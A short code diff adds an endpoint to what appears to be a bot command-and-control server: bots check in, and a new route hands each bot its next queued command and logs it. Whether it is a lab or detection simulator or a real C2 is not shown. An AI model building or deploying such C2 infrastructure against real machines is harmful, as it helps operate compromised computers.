@@ -49,3 +49,21 @@ def checkin(request: CheckinRequest):
     )
 
     return {"status": "ok", "bot_id": request.bot_id, "interval_logged": interval}
+
+@app.get("/command/{bot_id}")
+def get_command(bot_id):
+
+    if bot_id in command_queue and command_queue[bot_id]:
+
+        cmd = command_queue[bot_id].pop(0)
+
+        insert_log(
+            bot_id = bot_id,
+            event_type = "command",
+            payload_size = len(str(cmd)),
+            metadata = cmd
+        )
+
+        return {"status": "command", "command": cmd}
+    
+    return {"status": "idle"}
